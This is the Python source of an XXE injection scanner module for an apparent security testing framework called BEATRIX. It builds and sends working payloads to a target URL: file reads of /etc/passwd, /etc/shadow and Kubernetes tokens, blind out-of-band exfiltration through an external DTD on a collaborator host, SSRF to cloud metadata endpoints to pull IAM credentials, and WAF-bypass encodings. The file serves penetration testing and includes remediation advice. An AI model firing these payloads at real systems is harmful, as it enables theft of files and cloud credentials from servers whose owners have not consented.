"""
BEATRIX XML External Entity (XXE) Injection Scanner

Born from: OWASP WSTG-INPV-07 + PortSwigger XXE research
https://portswigger.net/web-security/xxe

TECHNIQUE:
1. Detect XML parsing by sending well-formed XML and observing acceptance
2. In-band XXE: inject ENTITY declarations referencing local files (/etc/passwd, C:\\windows\\win.ini)
3. Blind XXE via Out-of-Band: DTD callout to attacker-controlled server (DNS/HTTP)
4. XXE via error messages: provoke parser errors that leak file contents
5. XInclude attacks: when you can't control the full XML document
6. XXE via SVG/DOCX/XLSX/SOAP: file format abuse vectors
7. Parameter entity injection for WAF bypass
8. UTF-7/UTF-16 encoding bypasses

SEVERITY: HIGH-CRITICAL — XXE can achieve:
- Local file read → /etc/passwd, /etc/shadow, application configs, source code
- SSRF → internal network probing, cloud metadata access (169.254...)
- Denial of Service → Billion Laughs attack (exponential entity expansion)
- Remote Code Execution → expect:// wrapper (PHP), jar:// (Java)
- Port scanning → use external entities to probe internal network

OWASP: WSTG-INPV-07 (Testing for XML Injection)
       A03:2021 - Injection (XXE)

MITRE: T1190 (Exploit Public-Facing Application)
       T1005 (Data from Local System)

CWE: CWE-611 (Improper Restriction of XML External Entity Reference)
     CWE-776 (Improper Restriction of Recursive Entity References in DTDs — Billion Laughs)
     CWE-91 (XML Injection — aka Blind XPath Injection)

REFERENCES:
- https://portswigger.net/web-security/xxe
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
"""

import base64
import random
import re
import string
import time
from dataclasses import dataclass
from enum import Enum
from typing import Any, AsyncIterator, Dict, List, Optional

try:
    import httpx
except ImportError:
    httpx = None

from beatrix.core.types import Confidence, Finding, Severity

from .base import BaseScanner, ScanContext

# =============================================================================
# DATA MODELS
# =============================================================================

class XXEVariant(Enum):
    """XXE attack technique variants"""
    CLASSIC_FILE_READ = "classic_file_read"        # Standard ENTITY → file://
    OOB_HTTP = "oob_http"                          # Blind XXE → HTTP callback
    OOB_DNS = "oob_dns"                            # Blind XXE → DNS callback
    ERROR_BASED = "error_based"                     # Parser error leaks content
    XINCLUDE = "xinclude"                          # XInclude when no DTD control
    PARAMETER_ENTITY = "parameter_entity"           # %entity; for WAF bypass
    SSRF = "ssrf"                                   # XXE → SSRF to internal services
    CDATA_EXFIL = "cdata_exfil"                    # CDATA wrapping for binary files
    DOCTYPE_OVERRIDE = "doctype_override"           # Override existing DOCTYPE
    SVG = "svg"                                     # XXE via SVG upload
    UTF7_BYPASS = "utf7_bypass"                     # Encoding-based WAF bypass


class XXETarget(Enum):
    """Where to inject XXE payloads"""
    XML_BODY = "xml_body"          # Full XML POST body
    SOAP = "soap"                  # SOAP envelope
    CONTENT_TYPE = "content_type"  # Switch JSON → XML
    FILE_UPLOAD = "file_upload"    # SVG/DOCX/XLSX with XXE
    PARAMETER = "parameter"       # XML in parameter value


@dataclass
class XXEPayload:
    """A single XXE test payload"""
    name: str
    variant: XXEVariant
    xml: str
    expected_pattern: Optional[str] = None  # Regex to match in response
    content_type: str = "application/xml"
    description: str = ""


@dataclass
class XXEResult:
    """Result from an XXE test"""
    payload: XXEPayload
    response_status: int
    response_body: str
    response_time: float
    matched: bool = False
    extracted_data: Optional[str] = None


# =============================================================================
# FILE TARGETS — what to read on different OS
# =============================================================================

LINUX_FILES = [
    "/etc/passwd",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/etc/shadow",
    "/etc/os-release",
    "/proc/version",
]

WINDOWS_FILES = [
    "C:\\windows\\win.ini",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    "C:\\inetpub\\wwwroot\\web.config",
]

# File patterns to detect successful read
FILE_READ_PATTERNS = {
    "/etc/passwd": r"root:.*:0:0:",
    "/etc/hostname": r"^[a-zA-Z0-9\-\.]+$",
    "/proc/self/environ": r"(PATH=|HOME=|USER=|HOSTNAME=)",
    "/etc/os-release": r"(PRETTY_NAME|VERSION_ID|ID=)",
    "C:\\windows\\win.ini": r"\[fonts\]|\[extensions\]",
    "C:\\windows\\system32\\drivers\\etc\\hosts": r"localhost",
    "/etc/shadow": r"root:\$[0-9a-z]+\$",
}


# =============================================================================
# SCANNER
# =============================================================================

class XXEScanner(BaseScanner):
    """
    XML External Entity Injection Scanner.

    Tests for XXE in XML-accepting endpoints with multiple techniques:
    - Classic file read (ENTITY → file://)
    - Blind/OOB (ENTITY → http:// to collaborator)
    - Error-based (provoke parser error leaking file content)
    - XInclude (when you can't control full document)
    - Parameter entity injection (bypass WAFs filtering ENTITY)
    - Content-Type switching (JSON → XML)
    - SVG/file format XXE
    """

    name = "xxe"
    description = "XML External Entity Injection Scanner"
    version = "1.0.0"

    checks = [
        "xxe_file_read",
        "xxe_blind_oob",
        "xxe_error_based",
        "xxe_xinclude",
        "xxe_ssrf",
        "xxe_parameter_entity",
        "xxe_content_type_switch",
        "xxe_encoding_bypass",
    ]

    owasp_category = "WSTG-INPV-07"
    mitre_technique = "T1190"

    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.collaborator_domain = self.config.get("collaborator", "")
        self.safe_mode = self.config.get("safe_mode", True)
        self.canary = self._generate_canary()
        self.test_both_os = self.config.get("test_both_os", True)

    def _generate_canary(self) -> str:
        """Generate unique canary for blind detection"""
        return "BTRX" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))

    # =========================================================================
    # PAYLOAD GENERATION
    # =========================================================================

    def _build_classic_payloads(self) -> List[XXEPayload]:
        """Classic in-band XXE file read payloads"""
        payloads = []

        target_files = LINUX_FILES[:4]  # Start with safe, common files
        if self.test_both_os:
            target_files += WINDOWS_FILES[:2]

        for filepath in target_files:
            # Standard ENTITY
            payloads.append(XXEPayload(
                name=f"classic_entity_{filepath.split('/')[-1]}",
                variant=XXEVariant.CLASSIC_FILE_READ,
                xml=(
                    f'<?xml version="1.0" encoding="UTF-8"?>\n'
                    f'<!DOCTYPE foo [\n'
                    f'  <!ENTITY xxe SYSTEM "file://{filepath}">\n'
                    f']>\n'
                    f'<root><data>&xxe;</data></root>'
                ),
                expected_pattern=FILE_READ_PATTERNS.get(filepath),
                description=f"Classic XXE file read: {filepath}",
            ))

            # php://filter (for PHP apps, avoids binary issues)
            if not filepath.startswith("C:"):
                payloads.append(XXEPayload(
                    name=f"php_filter_{filepath.split('/')[-1]}",
                    variant=XXEVariant.CLASSIC_FILE_READ,
                    xml=(
                        f'<?xml version="1.0" encoding="UTF-8"?>\n'
                        f'<!DOCTYPE foo [\n'
                        f'  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={filepath}">\n'
                        f']>\n'
                        f'<root><data>&xxe;</data></root>'
                    ),
                    expected_pattern=r"^[A-Za-z0-9+/=]{20,}$",
                    description=f"PHP filter base64 file read: {filepath}",
                ))

        return payloads

    def _build_oob_payloads(self) -> List[XXEPayload]:
        """Blind/Out-of-Band XXE payloads (require collaborator)"""
        if not self.collaborator_domain:
            return []

        payloads = []

        # HTTP OOB
        payloads.append(XXEPayload(
            name="oob_http_basic",
            variant=XXEVariant.OOB_HTTP,
            xml=(
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY xxe SYSTEM "http://{self.canary}.{self.collaborator_domain}/">\n'
                f']>\n'
                f'<root><data>&xxe;</data></root>'
            ),
            description="Blind XXE via HTTP callback",
        ))

        # HTTP OOB with file exfiltration via parameter entity
        payloads.append(XXEPayload(
            name="oob_exfil_param_entity",
            variant=XXEVariant.OOB_HTTP,
            xml=(
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY % file SYSTEM "file:///etc/hostname">\n'
                f'  <!ENTITY % dtd SYSTEM "http://{self.collaborator_domain}/evil.dtd">\n'
                f'  %dtd;\n'
                f'  %send;\n'
                f']>\n'
                f'<root><data>test</data></root>'
            ),
            description="Blind XXE data exfil via external DTD + parameter entity",
        ))

        # DNS only OOB (works even when HTTP is blocked)
        payloads.append(XXEPayload(
            name="oob_dns_only",
            variant=XXEVariant.OOB_DNS,
            xml=(
                f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE foo [\n'
                f'  <!ENTITY % xxe SYSTEM "http://{self.canary}.dns.{self.collaborator_domain}/">\n'
                f'  %xxe;\n'
                f']>\n'
                f'<root>test</root>'
            ),
            description="Blind XXE DNS-only callback (bypasses HTTP egress filters)",
        ))

        return payloads

    def _build_error_based_payloads(self) -> List[XXEPayload]:
        """Error-based XXE — force parser errors that leak file content"""
        payloads = []

        # Reference non-existent file to trigger error with content
        payloads.append(XXEPayload(
            name="error_based_nonexist",
            variant=XXEVariant.ERROR_BASED,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
                '  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
                '\'file:///nonexistent/%file;\'>">\n'
                '  %eval;\n'
                '  %error;\n'
                ']>\n'
                '<root>test</root>'
            ),
            expected_pattern=r"root:.*:0:0:",
            description="Error-based XXE: file content in error message via bad path",
        ))

        # Invalid URI scheme to force error
        payloads.append(XXEPayload(
            name="error_based_scheme",
            variant=XXEVariant.ERROR_BASED,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY % file SYSTEM "file:///etc/hostname">\n'
                '  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
                '\'invalid:///%file;\'>">\n'
                '  %eval;\n'
                '  %error;\n'
                ']>\n'
                '<root>test</root>'
            ),
            expected_pattern=r"[a-zA-Z0-9\-\.]+",
            description="Error-based XXE: invalid scheme triggers error with file content",
        ))

        return payloads

    def _build_xinclude_payloads(self) -> List[XXEPayload]:
        """XInclude payloads — when you can't inject full DOCTYPE"""
        payloads = []

        # Standard XInclude
        payloads.append(XXEPayload(
            name="xinclude_etc_passwd",
            variant=XXEVariant.XINCLUDE,
            xml=(
                '<foo xmlns:xi="http://www.w3.org/2001/XInclude">\n'
                '<xi:include parse="text" href="file:///etc/passwd"/>\n'
                '</foo>'
            ),
            expected_pattern=r"root:.*:0:0:",
            description="XInclude file read (no DOCTYPE needed)",
        ))

        # XInclude as value (embeddable in any XML field)
        payloads.append(XXEPayload(
            name="xinclude_inline",
            variant=XXEVariant.XINCLUDE,
            xml=(
                '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" '
                'parse="text" href="file:///etc/passwd"/>'
            ),
            expected_pattern=r"root:.*:0:0:",
            description="Inline XInclude (inject into any XML element value)",
        ))

        return payloads

    def _build_ssrf_payloads(self) -> List[XXEPayload]:
        """XXE → SSRF payloads targeting internal services and cloud metadata"""
        payloads = []

        # AWS metadata (IMDSv1)
        payloads.append(XXEPayload(
            name="ssrf_aws_metadata",
            variant=XXEVariant.SSRF,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">\n'
                ']>\n'
                '<root><data>&xxe;</data></root>'
            ),
            expected_pattern=r"(ami-id|instance-id|iam|hostname|public-keys)",
            description="XXE → SSRF: AWS EC2 metadata (IMDSv1)",
        ))

        # AWS IAM credentials
        payloads.append(XXEPayload(
            name="ssrf_aws_iam",
            variant=XXEVariant.SSRF,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">\n'
                ']>\n'
                '<root><data>&xxe;</data></root>'
            ),
            expected_pattern=r"(AccessKeyId|SecretAccessKey|Token)",
            description="XXE → SSRF: AWS IAM credentials via metadata",
        ))

        # GCP metadata
        payloads.append(XXEPayload(
            name="ssrf_gcp_metadata",
            variant=XXEVariant.SSRF,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">\n'
                ']>\n'
                '<root><data>&xxe;</data></root>'
            ),
            expected_pattern=r"(instance|project)",
            description="XXE → SSRF: GCP metadata",
        ))

        # Azure metadata
        payloads.append(XXEPayload(
            name="ssrf_azure_metadata",
            variant=XXEVariant.SSRF,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">\n'
                ']>\n'
                '<root><data>&xxe;</data></root>'
            ),
            expected_pattern=r"(vmId|location|subscriptionId)",
            description="XXE → SSRF: Azure instance metadata",
        ))

        # Kubernetes service account
        payloads.append(XXEPayload(
            name="ssrf_k8s_token",
            variant=XXEVariant.SSRF,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">\n'
                ']>\n'
                '<root><data>&xxe;</data></root>'
            ),
            expected_pattern=r"eyJ[A-Za-z0-9_-]+\.",
            description="XXE file read: Kubernetes service account JWT",
        ))

        return payloads

    def _build_parameter_entity_payloads(self) -> List[XXEPayload]:
        """Parameter entity payloads (bypass ENTITY keyword filtering)"""
        payloads = []

        payloads.append(XXEPayload(
            name="param_entity_file",
            variant=XXEVariant.PARAMETER_ENTITY,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY % file SYSTEM "file:///etc/passwd">\n'
                '  <!ENTITY % wrapper "<!ENTITY content \'%file;\'>">\n'
                '  %wrapper;\n'
                ']>\n'
                '<root><data>&content;</data></root>'
            ),
            expected_pattern=r"root:.*:0:0:",
            description="Parameter entity indirection to bypass ENTITY filtering",
        ))

        return payloads

    def _build_encoding_bypass_payloads(self) -> List[XXEPayload]:
        """Encoding-based WAF bypass payloads"""
        payloads = []

        # UTF-16 encoded XXE
        payloads.append(XXEPayload(
            name="utf16_bypass",
            variant=XXEVariant.UTF7_BYPASS,
            xml=(
                '<?xml version="1.0" encoding="UTF-16"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
                ']>\n'
                '<root><data>&xxe;</data></root>'
            ),
            expected_pattern=r"root:.*:0:0:",
            content_type="application/xml; charset=utf-16",
            description="UTF-16 encoded XXE to bypass WAF pattern matching",
        ))

        # No XML declaration (some parsers accept)
        payloads.append(XXEPayload(
            name="no_declaration",
            variant=XXEVariant.DOCTYPE_OVERRIDE,
            xml=(
                '<!DOCTYPE foo [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
                ']>\n'
                '<root><data>&xxe;</data></root>'
            ),
            expected_pattern=r"root:.*:0:0:",
            description="XXE without XML declaration (parser tolerance test)",
        ))

        return payloads

    def _build_svg_payload(self) -> XXEPayload:
        """SVG file with embedded XXE"""
        return XXEPayload(
            name="svg_xxe",
            variant=XXEVariant.SVG,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE svg [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
                ']>\n'
                '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
                '  <text x="0" y="15">&xxe;</text>\n'
                '</svg>'
            ),
            expected_pattern=r"root:.*:0:0:",
            content_type="image/svg+xml",
            description="XXE via SVG file upload",
        )

    def _build_content_type_switch_payload(self) -> XXEPayload:
        """Switch Content-Type from JSON to XML (many frameworks auto-detect)"""
        return XXEPayload(
            name="json_to_xml_switch",
            variant=XXEVariant.DOCTYPE_OVERRIDE,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
                ']>\n'
                '<root>\n'
                '  <username>&xxe;</username>\n'
                '  <password>test</password>\n'
                '</root>'
            ),
            expected_pattern=r"root:.*:0:0:",
            content_type="application/xml",
            description="Content-Type switch from JSON→XML (framework auto-detection exploit)",
        )

    def _build_soap_payloads(self) -> List[XXEPayload]:
        """XXE via SOAP envelopes"""
        payloads = []

        payloads.append(XXEPayload(
            name="soap_xxe",
            variant=XXEVariant.CLASSIC_FILE_READ,
            xml=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE foo [\n'
                '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
                ']>\n'
                '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\n'
                '  <soapenv:Header/>\n'
                '  <soapenv:Body>\n'
                '    <data>&xxe;</data>\n'
                '  </soapenv:Body>\n'
                '</soapenv:Envelope>'
            ),
            expected_pattern=r"root:.*:0:0:",
            content_type="text/xml; charset=utf-8",
            description="XXE via SOAP envelope",
        ))

        return payloads

    # =========================================================================
    # SCAN LOGIC
    # =========================================================================

    def _inject_poc_server_collaborator(self, context: ScanContext) -> None:
        """Use local PoC server as collaborator if available and no external one configured."""
        poc_server = context.extra.get("poc_server") if context.extra else None
        if poc_server and not self.collaborator_domain:
            # Use the PoC server's host:port as the collaborator domain
            self.collaborator_domain = f"{poc_server.host}:{poc_server.port}"
            self.canary = self._generate_canary()
            # Register the OOB callback so the server knows to expect it
            poc_server.register_oob_payload(self.canary, {"scanner": "xxe", "url": context.url})

    async def scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """Main scan: test for XXE on XML-accepting endpoints"""

        # Automatically use local PoC server for OOB detection
        self._inject_poc_server_collaborator(context)

        # Phase 1: Detect if endpoint accepts XML
        accepts_xml = await self._probe_xml_acceptance(context)

        # Phase 2: Try all payload categories
        all_payloads = []
        all_payloads.extend(self._build_classic_payloads())
        all_payloads.extend(self._build_error_based_payloads())
        all_payloads.extend(self._build_xinclude_payloads())
        all_payloads.extend(self._build_parameter_entity_payloads())
        all_payloads.extend(self._build_encoding_bypass_payloads())
        all_payloads.extend(self._build_ssrf_payloads())
        all_payloads.extend(self._build_oob_payloads())
        all_payloads.append(self._build_svg_payload())
        all_payloads.extend(self._build_soap_payloads())

        # If endpoint doesn't accept XML, also try content-type switch
        if not accepts_xml:
            all_payloads.append(self._build_content_type_switch_payload())

        for payload in all_payloads:
            try:
                result = await self._send_xxe_payload(context, payload)
                if result and result.matched:
                    severity = Severity.CRITICAL
                    if payload.variant == XXEVariant.SSRF:
                        severity = Severity.CRITICAL
                    elif payload.variant in (XXEVariant.OOB_HTTP, XXEVariant.OOB_DNS):
                        severity = Severity.HIGH
                    elif payload.variant == XXEVariant.ERROR_BASED:
                        severity = Severity.HIGH

                    yield self.create_finding(
                        title=f"XXE Injection: {payload.name}",
                        severity=severity,
                        confidence=Confidence.CERTAIN if result.extracted_data else Confidence.FIRM,
                        url=context.url,
                        description=(
                            f"{payload.description}\n\n"
                            f"Variant: {payload.variant.value}\n"
                            f"Response status: {result.response_status}\n"
                            + (f"Extracted data: {result.extracted_data[:500]}\n" if result.extracted_data else "")
                        ),
                        evidence=result.extracted_data or result.response_body[:1000],
                        request=payload.xml,
                        response=result.response_body[:2000],
                        remediation=(
                            "1. Disable DTD processing entirely in XML parser configuration\n"
                            "2. Disable external entity loading (FEATURE_SECURE_PROCESSING)\n"
                            "3. Use less complex data formats (JSON) where possible\n"
                            "4. Patch/upgrade XML processors\n"
                            "5. Input validation: reject DOCTYPE declarations\n"
                            "6. For Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)\n"
                            "7. For PHP: libxml_disable_entity_loader(true)\n"
                            "8. For .NET: XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit"
                        ),
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection",
                            "https://portswigger.net/web-security/xxe",
                            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                        ],
                    )
            except Exception:
                continue

        # Run passive scan
        async for finding in self.passive_scan(context):
            yield finding

    async def _probe_xml_acceptance(self, context: ScanContext) -> bool:
        """Check if endpoint accepts XML content"""
        test_xml = '<?xml version="1.0"?><root><test>probe</test></root>'
        try:
            resp = await self.post(
                context.url,
                content=test_xml,
                headers={"Content-Type": "application/xml"},
            )
            # Accepted if not 415 (Unsupported Media Type) and not 400 with XML error
            return resp.status_code not in (415, 406)
        except Exception:
            return False

    async def _send_xxe_payload(
        self, context: ScanContext, payload: XXEPayload
    ) -> Optional[XXEResult]:
        """Send an XXE payload and analyze the response"""
        try:
            start = time.monotonic()
            resp = await self.post(
                context.url,
                content=payload.xml,
                headers={"Content-Type": payload.content_type},
            )
            elapsed = time.monotonic() - start

            body = resp.text
            matched = False
            extracted = None

            if payload.expected_pattern:
                match = re.search(payload.expected_pattern, body, re.MULTILINE)
                if match:
                    matched = True
                    extracted = match.group(0)

            # Check for base64 data (php://filter payloads)
            if not matched and payload.variant == XXEVariant.CLASSIC_FILE_READ:
                b64_match = re.search(r'[A-Za-z0-9+/]{40,}={0,2}', body)
                if b64_match:
                    try:
                        decoded = base64.b64decode(b64_match.group(0)).decode("utf-8", errors="replace")
                        if "root:" in decoded or "[fonts]" in decoded or "PATH=" in decoded:
                            matched = True
                            extracted = decoded[:500]
                    except Exception:
                        pass

            # Check for XML parser errors that might leak info
            if not matched and payload.variant == XXEVariant.ERROR_BASED:
                error_patterns = [
                    r"failed to load external entity",
                    r"I/O error.*file:///",
                    r"root:.*:0:0:",
                    r"SYSTEM.*file://",
                ]
                for ep in error_patterns:
                    em = re.search(ep, body, re.IGNORECASE)
                    if em:
                        matched = True
                        extracted = em.group(0)
                        break

            return XXEResult(
                payload=payload,
                response_status=resp.status_code,
                response_body=body,
                response_time=elapsed,
                matched=matched,
                extracted_data=extracted,
            )
        except Exception:
            return None

    async def passive_scan(self, context: ScanContext) -> AsyncIterator[Finding]:
        """Detect XXE attack surface from response analysis"""
        if not context.response:
            return

        body = context.response.body if hasattr(context.response, 'body') else ""
        headers = context.response.headers if hasattr(context.response, 'headers') else {}

        content_type = headers.get("content-type", "").lower()

        # Detect XML content types (potential attack surface)
        xml_indicators = [
            "application/xml",
            "text/xml",
            "application/soap+xml",
            "application/xhtml+xml",
            "image/svg+xml",
            "application/rss+xml",
            "application/atom+xml",
            "application/wsdl+xml",
        ]

        for indicator in xml_indicators:
            if indicator in content_type:
                yield self.create_finding(
                    title=f"XML Content Type Detected: {indicator}",
                    severity=Severity.INFO,
                    confidence=Confidence.CERTAIN,
                    url=context.url,
                    description=(
                        f"Endpoint returns {indicator} content type. "
                        f"This indicates XML parsing and may be vulnerable to XXE injection. "
                        f"Run active XXE scan to confirm."
                    ),
                    evidence=f"Content-Type: {content_type}",
                    remediation="Ensure XML parser has external entities disabled.",
                )
                break

        # Detect XML parser error messages
        xml_error_patterns = [
            (r"XML\s+pars(er|ing)\s+error", "XML Parser Error Disclosed"),
            (r"SAXParseException", "Java SAX Parser Error (XXE-relevant)"),
            (r"XMLSyntaxError", "Python lxml Parser Error (XXE-relevant)"),
            (r"SimpleXMLElement", "PHP SimpleXML Error (XXE-relevant)"),
            (r"MSXML[0-9]", ".NET MSXML Parser Error (XXE-relevant)"),
            (r"libxml", "libxml Parser Error (XXE-relevant)"),
            (r"DOCTYPE.*not\s+allowed", "DOCTYPE Blocked (XXE protection active)"),
            (r"external\s+entity", "External Entity Reference Detected"),
        ]

        for pattern, title in xml_error_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                yield self.create_finding(
                    title=title,
                    severity=Severity.LOW,
                    confidence=Confidence.FIRM,
                    url=context.url,
                    description=(
                        f"Detected XML parser information disclosure. "
                        f"Pattern: {pattern}"
                    ),
                    evidence=body[:500],
                    remediation="Suppress detailed XML parser errors in production.",
                )

        # Detect WSDL/XSD endpoints (SOAP services → XXE attack surface)
        wsdl_patterns = [
            r"<wsdl:definitions",
            r"<xs:schema",
            r"<xsd:schema",
            r"targetNamespace=",
        ]

        for pattern in wsdl_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                yield self.create_finding(
                    title="SOAP/WSDL Service Detected (XXE Attack Surface)",
                    severity=Severity.INFO,
                    confidence=Confidence.CERTAIN,
                    url=context.url,
                    description=(
                        "WSDL/XSD content detected. SOAP services commonly accept XML "
                        "and are frequent targets for XXE attacks."
                    ),
                    evidence=body[:500],
                    remediation="Ensure SOAP XML parser has external entity loading disabled.",
                )
                break
